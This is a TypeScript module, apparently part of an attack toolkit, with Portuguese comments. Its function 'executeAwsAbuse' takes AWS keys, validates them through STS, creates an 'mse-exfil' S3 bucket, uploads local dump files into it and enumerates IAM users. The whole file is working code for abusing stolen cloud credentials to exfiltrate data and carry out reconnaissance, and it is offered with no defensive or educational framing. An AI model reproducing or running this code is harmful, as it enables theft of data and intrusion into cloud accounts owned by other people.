import { S3Client, CreateBucketCommand, PutObjectCommand } from '@aws-sdk/client-s3';
import { STSClient, GetCallerIdentityCommand } from '@aws-sdk/client-sts';
import { IAMClient, ListUsersCommand } from '@aws-sdk/client-iam';
import { readFileSync } from 'fs';
import { join } from 'path';
import { DUMPS_DIR } from '../admin';

export interface AwsResult {
  success: boolean;
  accountId?: string;
  bucketName?: string;
  filesExfiltrated: number;
  usersEnumerated: number;
  error?: string;
}

export async function executeAwsAbuse(
  accessKey: string, 
  secretKey: string, 
  target: string,
  dumpFiles?: string[] // Receber lista de arquivos para exfiltrar
): Promise<AwsResult> {
  const credentials = {
    accessKeyId: accessKey,
    secretAccessKey: secretKey
  };

  const results: AwsResult = {
    success: false,
    filesExfiltrated: 0,
    usersEnumerated: 0
  };

  // 1. Validação da chave
  const sts = new STSClient({ credentials, region: 'us-east-1' });
  try {
    const identity = await sts.send(new GetCallerIdentityCommand({}));
    results.accountId = identity.Account;
  } catch (err) {
    results.error = 'Invalid AWS credentials';
    return results;
  }

  // 2. Cria bucket de exfiltração
  const bucketName = `mse-exfil-${Date.now().toString(36)}`;
  const s3 = new S3Client({ credentials, region: 'us-east-1' });

  try {
    await s3.send(new CreateBucketCommand({
      Bucket: bucketName,
      ACL: 'private'
    }));

    results.bucketName = bucketName;

    // 3. Sobe os dumps fornecidos
    if (dumpFiles && dumpFiles.length > 0) {
      for (const filename of dumpFiles) {
        try {
          const content = readFileSync(join(DUMPS_DIR, filename));
          await s3.send(new PutObjectCommand({
            Bucket: bucketName,
            Key: filename,
            Body: content,
            ServerSideEncryption: 'AES256'
          }));
          results.filesExfiltrated++;
        } catch (err) {
          console.error(`Failed to upload ${filename}:`, err);
        }
      }
    }
  } catch (err) {
    console.error('S3 error:', err);
  }

  // 4. Enumera usuários IAM
  const iam = new IAMClient({ credentials, region: 'us-east-1' });
  try {
    const users = await iam.send(new ListUsersCommand({}));
    results.usersEnumerated = users.Users?.length || 0;
  } catch (err) {
    // Pode não ter permissão, ignorar
  }

  results.success = true;
  return results;
}